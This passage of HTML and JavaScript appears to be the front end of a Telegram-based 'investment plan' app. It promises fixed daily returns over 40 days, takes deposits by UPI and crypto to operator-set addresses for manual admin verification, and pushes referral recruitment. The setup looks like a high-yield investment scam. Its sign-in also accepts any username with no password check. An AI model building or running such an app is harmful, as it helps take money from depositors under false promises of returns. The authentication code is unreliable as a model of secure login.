ter p-3 rounded-xl" style="background:rgba(0,0,0,0.4);"><span class="text-xs text-gray-500">🏦 Balance</span><span class="mono font-black '+(canAfford?'text-toxic':'text-red-400')+' text-sm">$'+fmt(S.user.balance)+'</span></div></div>'+btn+'<button onclick="closePlan()" class="w-full py-3 rounded-2xl text-xs font-bold" style="background:rgba(255,255,255,0.05); color:#9CA3AF;">Cancel</button></div></div>';
}

function activeTab() {
  var plans = S.user.activePlans || [];
  if(plans.length===0) return '<div class="glass-card text-center py-8"><p class="text-4xl font-black mb-2">0 <span class="text-lg text-gray-500">plans</span></p><p class="text-xs text-gray-500 mb-4">No active investments yet</p><button onclick="setTab(\'plans\')" class="btn-green w-full py-3.5 rounded-xl text-sm font-black">+ VIEW PLANS</button></div>';
  return plans.map(function(p){
    var pct = ((p.daysCollected||0)/40)*100;
    return '<div class="glass-card mb-3"><div class="flex justify-between items-center mb-3"><div><p class="font-black text-sm" style="color:'+p.color+'">'+p.icon+' '+p.name+'</p><p class="text-[10px] text-gray-500">Daily: $'+p.daily.toFixed(2)+'</p></div><span class="text-[9px] px-2 py-1 rounded-full bg-toxic/20 text-toxic font-bold">ACTIVE</span></div><div class="flex justify-between text-[10px] text-gray-500 mb-2"><span>Day '+(p.daysCollected||0)+' / 40</span><span>$'+((p.daysCollected||0)*p.daily).toFixed(2)+' / $'+p.total.toFixed(2)+'</span></div><div class="w-full h-1.5 rounded-full bg-white/5 overflow-hidden"><div class="h-full bg-toxic" style="width:'+pct+'%"></div></div></div>';
  }).join('');
}

function walletTab() {
  var upiQr = 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data='+encodeURIComponent('upi://pay?pa='+CONFIG.upi+'&pn='+CONFIG.upiName+'&cu=INR');
  var methods = ['UPI','USDT BEP20','USDT TRC20','BTC BEP20'].map(function(m,i){
    return '<button onclick="selMethod('+i+')" id="m-'+i+'" class="px-4 py-2 rounded-full text-xs font-bold whitespace-nowrap '+(i===0?'bg-toxic text-black':'bg-white/5 text-gray-400')+'">'+m+'</button>';
  }).join('');
  return '<div class="space-y-4"><div class="glass-card"><p class="text-[10px] text-toxic-dim font-bold mb-3">💳 DEPOSIT</p><div class="flex gap-2 overflow-x-auto hide-scroll pb-2 mb-4">'+methods+'</div><div class="rounded-2xl p-4 mb-4 text-center" style="background:rgba(0,0,0,0.4); border:1px dashed rgba(0,255,102,0.2);"><p class="text-[10px] text-gray-500 mb-2">SEND TO</p><p id="payAddr" class="mono text-xs text-toxic break-all mb-3">'+CONFIG.upi+'</p><div class="flex justify-center"><div class="bg-white p-2 rounded-2xl"><img id="qrImg" src="'+upiQr+'" class="w-36 h-36"></div></div></div><input type="number" id="depAmt" class="input-dark mb-3" placeholder="Amount"><div id="utrWrap"><input type="text" id="depUtr" maxlength="12" class="input-dark mb-3" placeholder="12-Digit UTR"></div><div id="txWrap" style="display:none;"><input type="text" id="depTx" class="input-dark mb-3" placeholder="TxHash"></div><button onclick="submitDeposit()" id="depBtn" class="btn-green w-full py-4 rounded-2xl text-sm font-black">Submit UTR</button></div><div class="glass-card"><p class="text-[10px] text-toxic-dim font-bold mb-3">💸 WITHDRAW</p><input type="number" id="wdAmt" class="input-dark mb-3" placeholder="Min $'+CONFIG.minWithdraw+'"><input type="text" id="wdAddr" class="input-dark mb-3" placeholder="USDT Address"><button onclick="submitWithdraw()" class="w-full py-4 rounded-2xl text-sm font-black" style="background:rgba(255,255,255,0.05);">Request Withdrawal</button></div></div>';
}

function selMethod(i) {
  selM = i;
  var els = document.querySelectorAll('[id^="m-"]');
  for(var x=0;x<els.length;x++){ els[x].className = 'px-4 py-2 rounded-full text-xs font-bold whitespace-nowrap '+(x===i?'bg-toxic text-black':'bg-white/5 text-gray-400'); }
  var addrs = [CONFIG.upi, CONFIG.usdtBep20, CONFIG.usdtTrc20, CONFIG.btcBep20];
  $('payAddr').innerText = addrs[i];
  var data = i === 0 ? encodeURIComponent('upi://pay?pa='+CONFIG.upi+'&pn='+CONFIG.upiName+'&cu=INR') : addrs[i];
  $('qrImg').src = 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data='+data;
  if (i === 0) { $('utrWrap').style.display='block'; $('txWrap').style.display='none'; $('depBtn').innerText='Submit UTR'; }
  else { $('utrWrap').style.display='none'; $('txWrap').style.display='block'; $('depBtn').innerText='Submit TxHash'; }
}

function historyTab() {
  var tx = S.transactions.filter(function(t){return t.user === S.user.id});
  var h = '<div class="glass-card text-center mb-3"><p class="text-[10px] text-gray-500 mb-2">TOTAL TRANSACTIONS</p><p class="text-4xl font-black text-white">'+tx.length+'</p></div>';
  if (tx.length === 0) return h + '<div class="glass-card text-center py-12"><p class="text-lg font-black mb-2">No transactions</p><p class="text-xs text-gray-500">When you have activity, it will show here.</p></div>';
  return h + tx.map(function(t){ return '<div class="glass-card flex justify-between items-center mb-2"><div><p class="font-bold text-sm capitalize">'+t.type+'</p><p class="text-[10px] text-gray-500">'+t.method+' • '+(t.ref||'')+'</p></div><div class="text-right"><p class="mono font-black text-toxic">+$'+fmt(t.amount)+'</p><span class="text-[9px] px-2 py-1 rounded-full bg-yellow-400/10 text-yellow-400">'+t.status+'</span></div></div>'; }).join('');
}

function teamTab() {
  var u = S.user;
  var refLink = 'https://t.me/'+CONFIG.telegramBot+'?start='+u.referralCode;
  return '<div class="space-y-4"><div class="glass-card"><p class="text-[10px] text-toxic-dim font-bold mb-2">👥 YOUR NETWORK</p><h2 class="text-2xl font-black leading-tight mb-2">Build your network<br>and <span class="text-toxic">grow together.</span></h2></div><div class="grid grid-cols-2 gap-3"><div class="glass-card text-center"><p class="text-[9px] text-gray-500 mb-2">TOTAL REFERRALS</p><p class="text-2xl font-black">0</p></div><div class="glass-card text-center"><p class="text-[9px] text-gray-500 mb-2">ACTIVE REFERRALS</p><p class="text-2xl font-black">0</p></div></div><button onclick="copyText(\''+refLink+'\')" class="w-full py-4 rounded-2xl flex items-center justify-center gap-3 btn-green glow-green"><span class="text-2xl">🔗</span><div class="text-left"><p class="font-black text-sm">INVITE FRIENDS</p><p class="text-[10px] opacity-70">Share your link</p></div></button></div>';
}

function goSignup(){ S.tab='signup'; S.signupStep=1; render(); }
function goSignin(){ S.tab='signin'; render(); }
function saveCountry(v){ S.signupData.country = v; }

function nextStep(n) {
  if (n === 2) {
    if (!S.signupData.country && $('countrySel')) S.signupData.country = $('countrySel').value;
    if (!S.signupData.country) return alert('Select a country');
  }
  if (n === 3) {
    S.signupData.firstName = $('fn').value;
    S.signupData.lastName = $('ln').value;
    S.signupData.email = $('em').value;
    S.signupData.phone = $('ph').value;
    if (!S.signupData.firstName || !S.signupData.email) return alert('Fill Name and Email');
  }
  S.signupStep = n;
  render();
}

async function finishSignup() {
  var un = $('un').value.trim();
  var pw = $('pw').value;
  var pw2 = $('pw2').value;
  if (!un || un.length < 3) return alert('Username 3+ chars');
  if (!pw || pw.length < 4) return alert('Password 4+ chars');
  if (pw !== pw2) return alert('Passwords do not match');
  var userId = 'TG' + Date.now();
  var refCode = 'TOXIC' + Math.floor(1000 + Math.random()*9000);
  S.user = { id: userId, username: un, email: S.signupData.email, phone: S.signupData.phone, balance: 0, referralBalance: 0, activated: 0, earned: 0, ceiling: 0, invested: 0, activePlans: [], referralCode: refCode, joined: new Date().toISOString() };
  await apiCall('register', { userId: userId, username: un, email: S.signupData.email, phone: S.signupData.phone, balance: 0, referralCode: refCode });
  S.tab = 'dashboard';
  save(); render();
  alert('✅ Account created! Check Admin Panel.');
}

async function doSignIn() {
  var u = $('signinUser').value.trim();
  var p = $('signinPass').value;
  if (!u || !p) return alert('Enter username and password');
  var existing = JSON.parse(localStorage.getItem('toxic_user') || 'null');
  if (existing && existing.username === u) { S.user = existing; }
  else {
    var userId = 'TG' + Date.now();
    var refCode = 'TOXIC' + Math.floor(1000 + Math.random()*9000);
    S.user = { id: userId, username: u, email: '', phone: '', balance: 0, referralBalance: 0, activated: 0, earned: 0, ceiling: 0, invested: 0, activePlans: [], referralCode: refCode, joined: new Date().toISOString() };
    await apiCall('register', { userId: userId, username: u, email: '', phone: '', balance: 0, referralCode: refCode });
  }
  S.tab = 'dashboard';
  save(); render();
}

function doLogout() {
  if (!confirm('Logout?')) return;
  localStorage.removeItem('toxic_user');
  S.user = null; S.tab = 'signin'; render();
}

async function invest(id) {
  var p = PLANS.find(function(x){return x.id===id});
  if (!p) return;
  if (S.user.balance < p.deposit) return alert('Insufficient balance');
  S.user.balance -= p.deposit;
  S.user.invested += p.deposit;
  if (!S.user.activePlans) S.user.activePlans = [];
  S.user.activePlans.push({ id:p.id, name:p.name, daily:p.daily, total:p.total, color:p.color, icon:p.icon, daysCollected:0, started: Date.now() });
  save(); render();
  alert('✅ Invested $'+p.deposit+' in '+p.name+'!');
}

async function submitDeposit() {
  var amt = parseFloat($('depAmt').value);
  var isCrypto = selM !== 0;
  var utr = $('depUtr') ? $('depUtr').value.trim() : '';
  var tx = $('depTx') ? $('depTx').value.trim() : '';
  var ref = isCrypto ? tx : utr;
  if (!amt || amt < CONFIG.minDeposit) return alert('Min deposit $'+CONFIG.minDeposit);
  if (isCrypto && !ref) return alert('Enter TxHash');
  if (!isCrypto && utr.length !== 12) return alert('Enter valid 12-digit UTR');
  var method = ['UPI','USDT BEP20','USDT TRC20','BTC BEP20'][selM];
  S.transactions.push({ id: Date.now(), type: 'deposit', amount: amt, utr: isCrypto?'':utr, ref: ref, status: 'pending', method: method, user: S.user.id, date: new Date().toISOString() });
  await apiCall('deposit', { userId: S.user.id, username: S.user.username, amount: amt, method: method, ref: ref });
  save();
  $('depAmt').value='';
  if ($('depUtr')) $('depUtr').value='';
  if ($('depTx')) $('depTx').value='';
  alert('✅ Deposit submitted! Admin will verify within 24h.');
}

async function submitWithdraw() {
  var amt = parseFloat($('wdAmt').value);
  var addr = $('wdAddr').value.trim();
  if (!amt || amt < CONFIG.minWithdraw) return alert('Min withdrawal $'+CONFIG.minWithdraw);
  if (!addr) return alert('Enter USDT address');
  if (S.user.balance < amt) return alert('Insufficient balance');
  var fee = amt * CONFIG.withdrawFee;
  S.user.balance -= amt;
  S.transactions.push({ id: Date.now(), type: 'withdrawal', amount: amt - fee, fee: fee, address: addr, status: 'pending', method: 'USDT', user: S.user.id, date: new Date().toISOString() });
  await apiCall('withdrawal', { userId: S.user.id, username: S.user.username, amount: amt - fee, address: addr });
  save(); render();
  alert('✅ Withdrawal requested! You will receive $'+fmt(amt - fee));
}

function copyText(text) {
  navigator.clipboard.writeText(text).then(function(){alert('✅ Copied!')}).catch(function(){
    var el = document.createElement('textarea'); el.value = text; document.body.appendChild(el); el.select(); document.execCommand('copy'); document.body.removeChild(el); alert('✅ Copied!');
  });
}

try {
  if (window.Telegram && window.Telegram.WebApp) {
    window.Telegram.WebApp.ready();
    window.Telegram.WebApp.expand();
  }
} catch(e){}

if (!S.user) S.tab = 'signup';
render();
</script>
</body>
</html>
